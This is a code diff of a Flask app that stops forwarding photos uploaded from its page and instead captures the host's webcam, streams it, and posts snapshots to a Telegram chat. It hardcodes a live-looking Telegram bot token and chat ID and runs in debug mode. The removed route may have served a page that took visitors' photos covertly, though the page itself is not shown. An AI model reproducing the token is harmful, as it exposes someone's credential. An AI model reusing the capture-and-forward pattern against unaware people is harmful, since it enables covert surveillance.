@@ -1,39 +1,52 @@
-from flask import Flask, render_template, request
+from flask import Flask, render_template, Response
+import cv2
 import requests
-from datetime import datetime
-from io import BytesIO
+import numpy as np
 
 app = Flask(__name__)
+camera = cv2.VideoCapture(0)
 
-# Telegram Bot Settings
+# --- Telegram Bot Config ---
 BOT_TOKEN = "8354022777:AAF3qM-nVuU0zvWHn71WgFP4TqYCfDo2NPA"
 CHAT_ID = "1669489463"
 
-@app.route("/")
-def index():
-    return render_template("index.html")
-
-@app.route("/capture", methods=["POST"])
-def capture():
-    photo = request.files.get("photo")
-    if photo:
-        # Convert photo to BytesIO for Telegram upload
-        photo_bytes = BytesIO()
-        photo.save(photo_bytes)
-        photo_bytes.seek(0)
-
-        # Send photo to Telegram
-        files = {'photo': ("image.jpg", photo_bytes)}
-        data = {'chat_id': CHAT_ID}
-        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
-
-        response = requests.post(url, data=data, files=files)
-        if response.ok:
-            return "Photo sent to Telegram", 200
+def gen_frames():
+    while True:
+        success, frame = camera.read()
+        if not success:
+            break
         else:
-            return f"Failed to send photo: {response.text}", 500
+            ret, buffer = cv2.imencode('.jpg', frame)
+            frame = buffer.tobytes()
+            yield (b'--frame\r\n'
+                   b'Content-Type: image/jpeg\r\n\r\n' + frame + b'\r\n')
 
-    return "No photo received", 400
+@app.route('/')
+def index():
+    return render_template('index.html')
 
-if __name__ == "__main__":
+@app.route('/capture')
+def capture():
+    cap = cv2.VideoCapture(0)
+    # Wait for camera to warm up
+    for _ in range(5):
+        ret, frame = cap.read()
+    ret, frame = cap.read()
+    cap.release()
+
+    if ret:
+        _, img_encoded = cv2.imencode('.jpg', frame)
+        files = {'photo': ('image.jpg', img_encoded.tobytes())}
+        payload = {'chat_id': CHAT_ID}
+        telegram_url = f'https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto'
+        requests.post(telegram_url, data=payload, files=files)
+        return "Image sent to Telegram!"
+    else:
+        return "Failed to capture image", 500
+
+@app.route('/video')
+def video():
+    return Response(gen_frames(), mimetype='multipart/x-mixed-replace; boundary=frame')
+
+if __name__ == '__main__':
     app.run(debug=True)
